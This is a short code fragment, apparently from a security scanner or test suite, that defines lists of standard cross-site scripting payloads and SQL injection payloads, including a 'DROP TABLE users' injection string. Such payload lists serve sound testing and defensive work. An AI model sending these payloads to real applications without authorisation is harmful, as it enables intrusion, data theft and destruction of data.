XSS_PAYLOADS = [
"<script>alert(1)</script>",
"'\"><img src=x onerror=alert(1)>",
"<svg/onload=alert(1)>"
]

SQLI_PAYLOADS = [
"' OR '1'='1",
"'; DROP TABLE users; --",
"' UNION SELECT NULL, NULL, NULL --"
]